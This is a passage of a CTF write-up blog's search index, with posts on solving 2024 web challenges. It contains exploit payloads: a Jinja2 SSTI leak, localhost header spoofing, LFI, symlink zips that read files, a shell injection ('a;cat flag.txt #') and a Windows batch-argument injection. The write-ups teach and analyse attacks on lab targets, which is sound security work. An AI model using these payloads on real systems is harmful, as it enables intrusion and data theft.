style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e name:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                kings_safelist \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e [\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;{\u0026#39;\u003c/span\u003e,\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;}\u0026#39;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;ğ“¹\u0026#39;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;ğ“†£\u0026#39;\u003c/span\u003e,\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;ğ“€€\u0026#39;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;ğ“€\u0026#39;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;ğ“€‚\u0026#39;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;ğ“€ƒ\u0026#39;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;ğ“€„\u0026#39;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;ğ“€…\u0026#39;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;ğ“€†\u0026#39;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;ğ“€‡\u0026#39;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;ğ“€ˆ\u0026#39;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;ğ“€‰\u0026#39;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;ğ“€Š\u0026#39;\u003c/span\u003e, \n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                                    \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;ğ“€\u0026#39;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;ğ“€‘\u0026#39;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;ğ“€’\u0026#39;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;ğ“€“\u0026#39;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;ğ“€”\u0026#39;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;ğ“€•\u0026#39;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;ğ“€–\u0026#39;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;ğ“€—\u0026#39;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;ğ“€˜\u0026#39;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;ğ“€™\u0026#39;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;ğ“€š\u0026#39;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;ğ“€›\u0026#39;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;ğ“€œ\u0026#39;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;ğ“€\u0026#39;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;ğ“€\u0026#39;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;ğ“€Ÿ\u0026#39;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                                    \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;ğ“€ \u0026#39;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;ğ“€¡\u0026#39;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;ğ“€¢\u0026#39;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;ğ“€£\u0026#39;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;ğ“€¤\u0026#39;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;ğ“€¥\u0026#39;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;ğ“€¦\u0026#39;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;ğ“€§\u0026#39;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;ğ“€¨\u0026#39;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;ğ“€©\u0026#39;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;ğ“€ª\u0026#39;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;ğ“€«\u0026#39;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;ğ“€¬\u0026#39;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;ğ“€­\u0026#39;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;ğ“€®\u0026#39;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;ğ“€¯\u0026#39;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                                    \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;ğ“€°\u0026#39;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;ğ“€±\u0026#39;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;ğ“€²\u0026#39;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;ğ“€³\u0026#39;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;ğ“€´\u0026#39;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;ğ“€µ\u0026#39;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;ğ“€¶\u0026#39;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;ğ“€·\u0026#39;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;ğ“€¸\u0026#39;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;ğ“€¹\u0026#39;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;ğ“€º\u0026#39;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;ğ“€»\u0026#39;\u003c/span\u003e]  \n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                name \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u0026#39;\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003ejoin([char \u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e char \u003cspan style=\"color:#f92672\"\u003ein\u003c/span\u003e name \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e char\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eisalnum() \u003cspan style=\"color:#f92672\"\u003eor\u003c/span\u003e char \u003cspan style=\"color:#f92672\"\u003ein\u003c/span\u003e kings_safelist])\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                \n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e render_template_string(\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u0026#39;\u0026#39;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e                    \u0026lt;!DOCTYPE html\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e                    \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e                    \u0026lt;head\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e                        OMITTED\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e                    \u0026lt;/head\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e                    \u0026lt;body\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e                        \u0026lt;a href=\u0026#34;{{ url_for(\u0026#39;hallway\u0026#39;) }}\u0026#34; class=\u0026#34;return-link\u0026#34;\u0026gt;RETURN\u0026lt;/a\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e                        \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e                        {\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e% i\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003ef name %}\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e                            \u0026lt;h1\u0026gt;ğ“¹ğ“¹ğ“¹ Welcome to the Scarab Room, \u0026#39;\u0026#39;\u0026#39;\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e name \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u0026#39;\u0026#39; ğ“¹ğ“¹ğ“¹\u0026lt;/h1\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e                        {\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e% e\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003endif %}\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e                        \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e                    \u0026lt;/body\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e                    \u0026lt;/html\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e                \u0026#39;\u0026#39;\u0026#39;\u003c/span\u003e, name\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003ename, \u003cspan style=\"color:#f92672\"\u003e**\u003c/span\u003eglobals())\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003eexcept\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eException\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eas\u003c/span\u003e e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003epass\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e render_template(\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;scarab_room.html\u0026#39;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"leaking-information-via-scarab-room\"\u003eLeaking Information via Scarab Room\u003c/h2\u003e\n\u003cp\u003eSince both \u003cem\u003e{\u003c/em\u003e and \u003cem\u003e}\u003c/em\u003e are in \u003cem\u003ekings_safelist\u003c/em\u003e, we can send a Jinja2 expression in \u003cem\u003ename\u003c/em\u003e to \u003cem\u003escarab_room\u003c/em\u003e. This allows us to leak any alphanumerical global variables by sending \u003cem\u003e{{VARIABLE}}\u003c/em\u003e, since \u003cem\u003e**globals()\u003c/em\u003e are included. Looking at the code, we can leak \u003cem\u003eKINGSDAY\u003c/em\u003e and \u003cem\u003ePUBLICKEY\u003c/em\u003e this way, but not \u003cem\u003ePRIVATE_KEY\u003c/em\u003e, since it contains an underscore which isn\u0026rsquo;t permitted.\u003c/p\u003e","title":"CSAW CTF Qualification Round 2024 Lost Pyramid"},{"content":"Source Code Analysis The goal is to access the GET /flag endpoint which calls an executable that prints out the flag. It\u0026rsquo;s guarded by 2 checks:\nif session[:user] == \u0026quot;admin\u0026quot; if req.ip == \u0026quot;127.0.0.1\u0026quot; There\u0026rsquo;s also an interesting POST /download endpoint. It accepts any session but is also guarded by the if req.ip == \u0026quot;127.0.0.1\u0026quot; check. It serves a file based on filename from our request, which leads to LFI.\nBypassing 127.0.0.1 Restriction The 127.0.0.1 can be trivially bypassed by adding an X-Forwarded-For: 127.0.0.1. This works on local instances but it didn\u0026rsquo;t work on the remote instance during the CTF. As it turned out, the remote instance was behind Google Load Balancer which appended additional forwarded IPs to the header. The server used the last IP in the header for comparison (check the references). Thankfully, Rack supports the Forwarded header, it takes precedence over X-Forwarded headers and is not appended to by the load balancer. In conclusion, we can use Forwarded: for=127.0.0.1 to bypass this restriction.\nLeaking Session Secret and Forging Admin Session We use the 127.0.0.1 bypass and the POST /download endpoint to reveal the contents of server.rb. This file includes a constant server secret used to forge sessions.\nWe HTML decode the secret.\nNow, we could analyze the source code and write our own script for creating the session, but we just opt for replacing the secret in our local instance with the secret from remote.\nFinally, we log in locally as admin, then copy the session, and use it on remote to get the flag.\nThe final flag is: CSCTF{Y0u_G0t_1t_G00d_J0b}.\nReferences https://datatracker.ietf.org/doc/html/rfc7239 https://github.com/rack/rack/pull/1834 ","permalink":"http://localhost:1313/posts/cyberspacectf-2024-notekeeper/","summary":"\u003ch2 id=\"source-code-analysis\"\u003eSource Code Analysis\u003c/h2\u003e\n\u003cp\u003eThe goal is to access the \u003ccode\u003eGET /flag\u003c/code\u003e endpoint which calls an executable that prints out the flag. It\u0026rsquo;s guarded by 2 checks:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003eif session[:user] == \u0026quot;admin\u0026quot;\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eif req.ip == \u0026quot;127.0.0.1\u0026quot;\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"image.png\" alt=\"Alt text\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eThere\u0026rsquo;s also an interesting \u003ccode\u003ePOST /download\u003c/code\u003e endpoint. It accepts any session but is also guarded by the \u003ccode\u003eif req.ip == \u0026quot;127.0.0.1\u0026quot;\u003c/code\u003e check. It serves a file based on \u003ccode\u003efilename\u003c/code\u003e from our request, which leads to LFI.\u003c/p\u003e","title":"CyberSpace CTF 2024 Notekeeper"},{"content":"Intro This was a series of 3 web challenges (Trendz, Trendzz and Trendzzz) and 1 rev challenge (Trendzzzz) all related to one application. In this post I\u0026rsquo;ll briefly show how I solved all the web challenges related to it.\nRace Condition For POST_FLAG In order to get the POST_FLAG we have to make a request to /flag after we created 12 posts.\nHowever, the CreatePost(...) prevents us from submitting new posts once we\u0026rsquo;ve created 10 of them.\nWhat if we spammed a lot of requests at the same time? We submit 7 posts, then using Burp prepare a parallel single-packet attack submitting a few dozens of requests at once.\nWe check the GET /flag endpoint and find out that we successfully met the requirement of having at least 12 posts.\nFlag: CSCTF{d2426fb5-a93a-4cf2-b353-eac8e0e9cf94}.\n(If the attack fails for you, try again using another account and play around with the number of requests. The parralel single-byte attack should remove the network jitter, but there could still be internal latency at play).\nXSS For ADMIN_FLAG and SUPERADMIN_FLAG The organizers prepared a bot for us that\u0026rsquo;ll make superadmin visit a page with refreshtoken cookie set.\nUsing /getAccessToken?redirect=foo we can make superadmin get an accesstoken using the refreshtoken and navigate to any page we want.\nThe ViewPosts method in SuperAdminDash.go will return viewPost.tmpl without sanitizing data.\nReferences https://portswigger.net/research/smashing-the-state-machine#single-packet-attack https://infosecwriteups.com/hacking-htmx-applications-f8d29665faf ","permalink":"http://localhost:1313/posts/cyberspacectf-2024-trendz/","summary":"\u003ch2 id=\"intro\"\u003eIntro\u003c/h2\u003e\n\u003cp\u003eThis was a series of 3 web challenges (Trendz, Trendzz and Trendzzz) and 1 rev challenge (Trendzzzz) all related to one application. In this post I\u0026rsquo;ll briefly show how I solved all the web challenges related to it.\u003c/p\u003e\n\u003ch2 id=\"race-condition-for-post_flag\"\u003eRace Condition For POST_FLAG\u003c/h2\u003e\n\u003cp\u003eIn order to get the POST_FLAG we have to make a request to \u003ccode\u003e/flag\u003c/code\u003e  after we created 12 posts.\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"image.png\" alt=\"Alt text\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eHowever, the \u003ccode\u003eCreatePost(...)\u003c/code\u003e prevents us from submitting new posts once we\u0026rsquo;ve created 10 of them.\u003c/p\u003e","title":"CyberSpace CTF 2024 Trendz \u0026 Trendzz \u0026 Trendzzz"},{"content":"Initial Inspection After loading the page we\u0026rsquo;re greeted with an upload form for zip archives. We\u0026rsquo;re informed that after uploading we can access the files by appending a filename to a generated UUID.\nWe inspect the code and learn that our uploaded archive will be unzipped using unzip.\nZip With a Symlink We can use the zip command to create an archive that\u0026rsquo;ll preserve symlinks by using the -y option.\nIn order to retrieve the flag we create a symlink to /tmp/flag.txt and zip it. Once we download it, the symlink will be dereferenced on the target machine.\nln -s /tmp/flag.txt flag_symlink zip -y archive.zip flag_symlink We retrieve the flag from https://zipzone-web.challs.csc.tf/files/{RANDOM_UUID}/flag_symlink. The flag is: CSCTF{5yml1nk5_4r3_w31rd}\n","permalink":"http://localhost:1313/posts/cyberspacectf-2024-zip-zone/","summary":"\u003ch2 id=\"initial-inspection\"\u003eInitial Inspection\u003c/h2\u003e\n\u003cp\u003eAfter loading the page we\u0026rsquo;re greeted with an upload form for zip archives. We\u0026rsquo;re informed that after uploading we can access the files by appending a filename to a generated UUID.\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"image.png\" alt=\"Alt text\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eWe inspect the code and learn that our uploaded archive will be unzipped using \u003ccode\u003eunzip\u003c/code\u003e.\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"image-1.png\" alt=\"Alt text\"  /\u003e\n\u003c/p\u003e\n\u003ch2 id=\"zip-with-a-symlink\"\u003eZip With a Symlink\u003c/h2\u003e\n\u003cp\u003eWe can use the \u003ccode\u003ezip\u003c/code\u003e command to create an archive that\u0026rsquo;ll preserve symlinks by using the \u003ccode\u003e-y\u003c/code\u003e option.\u003c/p\u003e","title":"CyberSpace CTF 2024 Zip Zone"},{"content":"Source Code Analysis The aim of the challenge is to call the POST /feature which contains a command injection vulnerability.\nAs we can see, we need a valid signed access_token that contains the string access_granted.\nThere\u0026rsquo;s GET /release endpoint that\u0026rsquo;ll do exactly that if we pass the validate_server(...) check. Interestingly, if we set a query param debug=true, we can control the validation server address.\nThe validate_server(validation_server) method does the following:\ngets public key from the validation server, makes a GET request to the validation serve verifies the signature in the response using the date and the public key, returns true if the date is after NEW_FEATURE_RELEASE(which is set to 7 days in the future), or false otherwise. Since we can control the verificiation server address and all the data used for verifying the signature comes from it, we can pass date response we want and produce a valid signature for it.\nSetting Up Malicious Validation Server There\u0026rsquo;s already code for the validation server in the distribution file.\nWe copy the code and change the date to 10 days in the future so that it passes the NEW_FEATURE_RELEASE check, then launch the server and expose it globally.\nChaining Everything Together We make a request to GET /release?debug=true with base64-encoded preferences pointing to our validation server.\nWe know the validation succeeded from the Congratulations! The new feature is now available. in the response.\nWe copy the access token and proceed to POST /feature.\nNow we, read the flag by sending text=a;cat%20flag.txt%20# which makes the server type out the flag, and the rest is skipped with a comment: echo a;cat flag.txt # | wc -w.\nThe result flag is: CSCTF{d1d_y0u_71m3_7r4v3l_f0r_7h15_fl46?!}.\n","permalink":"http://localhost:1313/posts/cyberspacectf-2024-feature-unlocked/","summary":"\u003ch2 id=\"source-code-analysis\"\u003eSource Code Analysis\u003c/h2\u003e\n\u003cp\u003eThe aim of the challenge is to call the \u003ccode\u003ePOST /feature\u003c/code\u003e which contains a command injection vulnerability.\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"image-1.png\" alt=\"Alt text\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eAs we can see, we need a valid signed \u003ccode\u003eaccess_token\u003c/code\u003e that contains the string \u003ccode\u003eaccess_granted\u003c/code\u003e.\u003c/p\u003e\n\u003cp\u003eThere\u0026rsquo;s \u003ccode\u003eGET /release\u003c/code\u003e endpoint that\u0026rsquo;ll do exactly that if we pass the \u003ccode\u003evalidate_server(...)\u003c/code\u003e check. Interestingly, if we set a query param \u003ccode\u003edebug=true\u003c/code\u003e, we can control the validation server address.\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"image-2.png\" alt=\"Alt text\"  /\u003e\n\u003c/p\u003e","title":"CyberSpace CTF 2024 Feature Unlocked"},{"content":"Source Code Analysis At first glance, I thought the intended vulnerability was a race condition. However, upon closer examination I noticed a suspicious unset($_SESSION['username']); in logout.php.\nThe correct answer for each question is random, but it\u0026rsquo;s generated in advance both at the beginning of the quiz and upon submitting an answer.\nThe if (intval($answer) === $next_correct) {...} is the essential part of the challenge. Regardless if our answer is correct or wrong, it\u0026rsquo;ll call htmlspecialchars($_SESSION['username']), which will throw an exception if username is unset in the session. However, the exception stack trace will show us which line of code the exception was thrown at. Importantly, this all happens before game-related session data is changed, such as q_num and correct.\nError Line Number Oracle We create a new game, then log out and try submitting an answer (using the same sessionId). Since logout only unsets username, we\u0026rsquo;ll pass the initial check for game data in session, but an exception will be thrown when accessing username.\nThe error Error: [2] Undefined array key \u0026quot;username\u0026quot; - /home/user/quiz.php:53 tells us exactly at which line of code the error has occurred. Since it\u0026rsquo;s 53, it means that the answer we submitted was correct, because the execution entered the if (intval($answer) === $next_correct). If we enter another answer, the execution will enter the else {...} clause instead and throw at line 57.\nWith this, we can check which answer is correct without submitting it. The flow to get the flag is register, login, start the quiz then repeat 25 times: logout -\u0026gt; check which answer is correct (53 in error) -\u0026gt; login -\u0026gt; submit the correct answer.\nThe final flag is: CSCTF{3rr0r5_c4n_b3_0r4c135}.\n","permalink":"http://localhost:1313/posts/cyberspacectf-2024-quiz/","summary":"\u003ch2 id=\"source-code-analysis\"\u003eSource Code Analysis\u003c/h2\u003e\n\u003cp\u003eAt first glance, I thought the intended vulnerability was a race condition. However, upon closer examination I noticed a suspicious \u003ccode\u003eunset($_SESSION['username']);\u003c/code\u003e in \u003ccode\u003elogout.php\u003c/code\u003e.\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"image.png\" alt=\"Alt text\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eThe correct answer for each question is random, but it\u0026rsquo;s generated in advance both at the beginning of the quiz and upon submitting an answer.\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"image-1.png\" alt=\"Alt text\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"image-2.png\" alt=\"Alt text\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eThe \u003ccode\u003eif (intval($answer) === $next_correct) {...}\u003c/code\u003e is the essential part of the challenge. Regardless if our answer is correct or wrong, it\u0026rsquo;ll call \u003ccode\u003ehtmlspecialchars($_SESSION['username'])\u003c/code\u003e, which will throw an exception if \u003ccode\u003eusername\u003c/code\u003e is unset in the session. However, the exception stack trace will show us which line of code the exception was thrown at. Importantly, this all happens before game-related session data is changed, such as \u003ccode\u003eq_num\u003c/code\u003e and \u003ccode\u003ecorrect\u003c/code\u003e.\u003c/p\u003e","title":"CyberSpace CTF 2024 Quiz"},{"content":"Source Code Analysis Upon inspecting the code, we find that there\u0026rsquo;s /ai/run path that sounds like it could let us execute something.\nIt\u0026rsquo;s \u0026ldquo;guarded\u0026rdquo; by middleware that inspects whether host in the uri or the request header \u0026lsquo;host\u0026rsquo; starts with 127.0.01.\nAfterwards, the execution is passed to handle_cmd which can execute one of 6 commands. For us, the intereting ones are displaying env vars\nAnd running a .bat script with an argument passed by us.\nSpoofing localhost We can trivially bypass the middleware check by sending a request with a header Host: 127.0.0.1.\nCommand Injection using BatBadBut \u0026amp; CVE-2024-24576 The are 2 important rules that we\u0026rsquo;ll exploit:\nWindows CreateProcess function implicitly spawns cmd.exe to execute batch files, cmd.exe expands variables before doing any other parsing. We can see in the source code that our arg is passed as a single argument to the command. However, due to the fact that all arguments to the spawned process are passed a single string in the Windows API and Rust can\u0026rsquo;t escape arguments in all cases we can achieve command injection. The passed command looks like this .\\\\scripts\\\\ping.bat \u0026quot;{ARG}\u0026quot; where {ARG} is input controlled by us. In order to achieve CI, we need to escape out of \u0026quot;\u0026quot; and pass \u0026amp; followed by our command, which is then going to be followed by the closing \u0026quot; of the argument.\nFirst, let\u0026rsquo;s figure out how to pass \u0026quot; to the command. As we saw in the source code, we can\u0026rsquo;t pass it directly because it\u0026rsquo;s blacklisted. However, cmd.exe will parse envvars before execution. Furthermore, we can get a substring of any environment variable. Let\u0026rsquo;s check what\u0026rsquo;s available using /ai/run?cmd=env .\nCARGO_PKG_DESCRIPTION contains quotation marks. We can get single \u0026quot; using (url escaped) %25CARGO_PKG_DESCRIPTION:~364,-140%25. Now, let\u0026rsquo;s input \u0026quot;\u0026amp;dir as our arg. This will make the resulting call .\\\\scripts\\\\ping.bat \u0026quot;\u0026quot;\u0026amp;dir \u0026quot; (Notice space at the end, so we don\u0026rsquo;t end up with \u0026amp;dir\u0026quot; instead). URL encoded and using an envvar substring for \u0026quot; this will be GET /ai/run?cmd=ping2\u0026amp;arg=%25CARGO_PKG_DESCRIPTION:~364,-140%25%26dir%20.\nSuccess! Now we can substitute type flag.txt in place of dir to read the flag content.\nFinal Thoughts I saw some people wrongly assume this is a CI in the PING command in the .bat script, but this is not the case (you can try echoing variables available in the script and see they\u0026rsquo;re not available).\nReferences https://flatt.tech/research/posts/batbadbut-you-cant-securely-execute-commands-on-windows/ https://blog.rust-lang.org/2024/04/09/cve-2024-24576.html https://book.hacktricks.xyz/windows-hardening/basic-cmd-for-pentesters#bypass-char-blacklisting ","permalink":"http://localhost:1313/posts/crewctf-2024-malkonkordo/","summary":"\u003ch2 id=\"source-code-analysis\"\u003eSource Code Analysis\u003c/h2\u003e\n\u003cp\u003eUpon inspecting the code, we find that there\u0026rsquo;s \u003ccode\u003e/ai/run\u003c/code\u003e path that sounds like it could let us execute something.\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"admin-route.png\" alt=\"Admin route\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eIt\u0026rsquo;s \u0026ldquo;guarded\u0026rdquo; by middleware that inspects whether host in the uri or the request header \u0026lsquo;host\u0026rsquo; starts with \u003ccode\u003e127.0.01\u003c/code\u003e.\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"middleware-localhost.png\" alt=\"Middleware localhost\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eAfterwards, the execution is passed to \u003ccode\u003ehandle_cmd\u003c/code\u003e which can execute one of 6 commands. For us, the intereting ones are displaying env vars\u003c/p\u003e","title":"CrewCTF 2024 Malkonkordo"},{"content":"Initial Inspection There\u0026rsquo;s no souce code provided for the challenge. The only thing we\u0026rsquo;re given to work with is a website that executes our input code presumably using Bun.\nAfter playing around with it for a bit we know that it\u0026rsquo;s Bun, since the Bun variable is available and allows us to call different methods.\nMore Recon There are quite a few limitations to our 